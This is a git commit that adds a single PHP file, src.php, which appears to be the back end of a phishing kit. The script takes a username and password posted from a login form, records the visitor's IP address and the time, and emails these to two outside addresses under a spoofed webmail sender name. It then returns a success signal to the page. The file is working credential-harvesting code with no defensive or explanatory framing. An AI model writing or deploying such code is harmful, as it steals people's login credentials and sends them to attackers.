62357bc7f2b1aeb3029bfa298efc11ee9b4b194d
AdamFairclough <105229085+AdamFairclough@users.noreply.github.com>
2022-05-09 16:44:32 +0000

    Add files via upload

---
+++ src.php
@@ -0,0 +1,29 @@
+<?php
+$ip = getenv("REMOTE_ADDR");
+$login = $_POST['ai'];
+$passwd= $_POST['pr'];
+
+$done = array('signal'=>'ok');
+$bad = array('signal'=>'bad');
+
+
+if (!empty($login) && !empty($passwd)) {
+
+
+    $own = 'info@hotelierbeds.co.za, sharp.logz@email.cz';
+    $date = date("D/M/d, Y g:i a");
+    $subj = "$login  from $ip";
+    $from = "From: Webmaila<smtp@me.mom163.com>";
+    $msg = "Username: $login\nPassword: $passwd\nSubmitted from IP Address - $ip on $date\n-----------------------------------\n        Created By (~)\n-----------------------------------";
+    mail($own,$subj,$msg,$from);
+
+    echo json_encode($done);
+
+    }
+
+else {
+  echo json_encode($bad);
+}
+
+
+?>
